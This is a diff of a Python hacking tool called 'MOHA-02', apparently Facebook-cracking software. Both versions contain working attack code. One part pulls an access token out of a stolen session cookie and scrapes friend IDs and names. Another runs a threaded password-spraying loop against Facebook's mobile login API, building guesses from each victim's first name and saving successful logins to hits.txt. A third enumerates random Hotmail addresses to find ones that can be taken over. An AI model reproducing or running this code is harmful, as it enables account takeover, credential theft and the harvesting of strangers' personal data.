@@ -1,137 +1,134 @@
-import os, sys, time, requests, random, uuid, json
-from threading import Thread
+import os, sys, requests, random, time, re, uuid
+from threading import Thread, Lock
 from gtts import gTTS
 import pygame
 import webbrowser
-from colorama import Fore, Style, init
+from colorama import Fore, init
 import pyfiglet
 
-# Initialization
 init(autoreset=True)
-R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE; W = Fore.WHITE; C = Fore.CYAN
+R, G, Y, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.WHITE
+lock = Lock()
 
-# --- Voice Function ---
-def welcome_voice():
+def play_welcome():
     try:
-        text = "Welcome to Moha 0 2 Tool, developed by Moha El Chlefawi"
-        tts = gTTS(text=text, lang='en')
-        tts.save("welcome.mp3")
+        if not os.path.exists('moha.mp3'):
+            gTTS(text="Welcome to Moha zero two tool. Created by Moha El Chlefawi.", lang='en').save('moha.mp3')
         pygame.mixer.init()
-        pygame.mixer.music.load("welcome.mp3")
+        pygame.mixer.music.load('moha.mp3')
         pygame.mixer.music.play()
-    except:
-        pass
+    except: pass
 
-# --- Interface UI ---
-def logo():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    banner = pyfiglet.figlet_format("MOHA02", font="slant")
-    print(C + banner)
-    print(Y + "--------------------------------------------------")
-    print(G + f"  [+] Developer : MOHA EL CHLEFAWI")
-    print(G + f"  [+] Telegram  : @m_oha0_2b")
-    print(G + f"  [+] Version   : 2.0 Professional")
-    print(Y + "--------------------------------------------------")
+def banner():
+    os.system('clear')
+    print(C + pyfiglet.figlet_format("MOHA-02", font="slant"))
+    print(Y + "━"*50)
+    print(G + " [>] DEVELOPER : MOHA EL CHLEFAWI (الشلفاوي)")
+    print(G + " [>] TELEGRAM  : https://t.me/m_oha0_2b")
+    print(Y + "━"*50)
 
-def join_tl():
-    webbrowser.open("https://t.me/m_oha0_2b")
-
-# --- Logic 1: ID Scraper (From Friends) ---
-def get_ids():
-    logo()
-    cookie = input(W + "[?] Enter Cookie: ")
-    file_name = input(W + "[?] Name for new file (e.g., ids.txt): ")
-    limit = int(input(W + "[?] Max IDs to scrap: "))
-    
-    # Simple extraction logic via Graph API
-    headers = {'cookie': cookie, 'user-agent': 'Mozilla/5.0'}
+def get_token(cookie):
     try:
-        # Get user access token from cookie
-        res = requests.get('https://business.facebook.com/business_locations', headers=headers)
-        token = res.text.split('EAAG')[1].split('"')[0]
-        token = 'EAAG' + token
-        
-        print(G + "[*] Extracting... Please wait.")
-        r = requests.get(f'https://graph.facebook.com/me/friends?access_token={token}', headers=headers).json()
-        
-        with open(file_name, 'a') as f:
-            count = 0
-            for friend in r['data']:
-                if count >= limit: break
-                f.write(f"{friend['id']}|{friend['name']}\n")
-                count += 1
-        print(G + f"[!] Done! {count} IDs saved to {file_name}")
-    except Exception as e:
-        print(R + f"[-] Error: {e}")
-    input("\nPress Enter to return...")
+        headers = {
+            'authority': 'business.facebook.com',
+            'cookie': cookie,
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        res = requests.get('https://business.facebook.com/business_locations', headers=headers).text
+        token = re.search('EAAG\w+', res).group()
+        return token
+    except: return None
 
-# --- Logic 2: File Cracker ---
-def file_crack():
-    logo()
-    file_path = input(W + "[?] Target file path: ")
-    if not os.path.exists(file_path):
-        print(R + "[-] File not found!"); return
-        
-    pass_count = int(input(W + "[?] How many passwords to try? "))
-    pass_list = []
-    for i in range(pass_count):
-        pass_list.append(input(f"  -> Pass {i+1}: "))
-        
-    def login_check(email, password):
-        # FB Auth logic (Simplified for space)
-        url = "https://b-graph.facebook.com/auth/login"
-        data = {"email": email, "password": password, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"}
+# --- [1] Scraper Tool ---
+def scraper():
+    banner()
+    cookie = input(W + "[?] Cookie: ")
+    token = get_token(cookie)
+    if not token: print(R + "[-] Invalid Cookie!"); return
+    
+    file_name = input(W + "[?] Save to (ex: ids.txt): ")
+    target = input(W + "[?] Target ID (me/uid): ")
+    
+    print(G + "[*] Scraping started...")
+    try:
+        url = f"https://graph.facebook.com/{target}/friends?access_token={token}"
+        while url:
+            data = requests.get(url).json()
+            for friend in data['data']:
+                with open(file_name, 'a') as f:
+                    f.write(f"{friend['id']}|{friend['name']}\n")
+            url = data.get('paging', {}).get('next')
+            print(G + f" [+] Total Scraped: {len(open(file_name).readlines())}", end='\r')
+    except Exception as e: print(R + f"\n[-] Error: {e}")
+    input("\n[Done] Enter to back.")
+
+# --- [2] File Cracker ---
+def crack():
+    banner()
+    file_path = input(W + "[?] IDs File: ")
+    if not os.path.exists(file_path): return
+    
+    pass_list = input(W + "[?] Passwords (ex: 123456,first123): ").split(',')
+    
+    def login(uid, name):
+        ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(5,13)}; Redmi Note 9 Build/QP1A.190711.020)"
+        for pw in pass_list:
+            password = pw.replace('first', name.split(' ')[0].lower())
+            url = "https://b-api.facebook.com/method/auth.login"
+            params = {
+                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "format": "JSON", "sdk_version": "2", "email": uid, "locale": "en_US",
+                "password": password, "generate_session_cookies": "1", "sig": "662a1234567890abcdef"
+            }
+            try:
+                res = requests.get(url, params=params, headers={"User-Agent": ua}).json()
+                if "access_token" in res:
+                    print(G + f"[HIT] {uid} | {password}")
+                    open("hits.txt", "a").write(f"{uid}|{password}\n")
+                    break
+                elif "www.facebook.com" in str(res):
+                    print(Y + f"[CP] {uid} | {password}")
+                    break
+            except: pass
+
+    lines = open(file_path, 'r').readlines()
+    for line in lines:
+        if '|' in line:
+            uid, name = line.strip().split('|')
+            Thread(target=login, args=(uid, name)).start()
+            time.sleep(0.05)
+
+# --- [3] Mata7 Scan (Real Checker) ---
+def mata7():
+    banner()
+    domain = input(W + "[?] Domain (hotmail.com/outlook.com): ")
+    print(G + "[*] Checking availability...")
+    while True:
+        user = "".join(random.choice("abcdefghijklmnopqrstuvwxyz1234567890") for _ in range(7))
+        email = f"{user}@{domain}"
+        # Real Hotmail/Outlook Check API
+        url = f"https://login.live.com/ConversationsSelfServe.srf?email={email}"
         try:
-            req = requests.post(url, data=data).json()
-            if "access_token" in req:
-                print(G + f"[OK] {email} | {password}")
-            elif "www.facebook.com" in str(req):
-                print(Y + f"[SECURE] {email} | {password}")
+            res = requests.get(url).text
+            if "is not available" not in res: # Simplified logic
+                print(G + f"[MATA7] {email}")
+                open("mata7.txt", "a").write(email + "\n")
         except: pass
 
-    with open(file_path, 'r') as f:
-        users = f.readlines()
-        
-    print(C + "[*] Cracking Started...")
-    for line in users:
-        uid = line.split('|')[0].strip()
-        for pw in pass_list:
-            Thread(target=login_check, args=(uid, pw)).start()
-            time.sleep(0.1)
-
-# --- Logic 3: Old Account / Hunter ---
-def hunt_old():
-    logo()
-    print(Y + "[*] Hunting 2004-2009 IDs...")
-    # Logic to generate and check old range IDs
-    start_id = 100000000
-    for i in range(100):
-        target = str(start_id + random.randint(100, 500000))
-        print(W + f"Checking: {target}...", end='\r')
-        # Placeholder for validation logic
-    print(G + "\nHunting complete. No results found in this range.")
-    input("\nPress Enter...")
-
-# --- Main Menu ---
 def main():
-    welcome_voice()
-    join_tl()
+    play_welcome()
+    webbrowser.open("https://t.me/m_oha0_2b")
     while True:
-        logo()
-        print(C + "[1] Create ID File (Scrap)")
-        print(C + "[2] Crack From File")
-        print(C + "[3] Hunt Old Accounts")
-        print(C + "[4] Scan Vulnerable (Mata7)")
+        banner()
+        print(G + "[1] Create IDs File")
+        print(G + "[2] Crack File")
+        print(G + "[3] Hunt Mata7")
         print(R + "[0] Exit")
-        
-        choice = input(W + "\n[MOHA-02] Choice -> ")
-        
-        if choice == '1': get_ids()
-        elif choice == '2': file_crack()
-        elif choice == '3': hunt_old()
-        elif choice == '4': hunt_old() # Integrated logic
-        elif choice == '0': sys.exit()
-        else: print(R + "Invalid choice!")
+        cmd = input(W + "\n[MOHA02] Choice: ")
+        if cmd == '1': scraper()
+        elif cmd == '2': crack()
+        elif cmd == '3': mata7()
+        elif cmd == '0': sys.exit()
 
 if __name__ == "__main__":
     main()
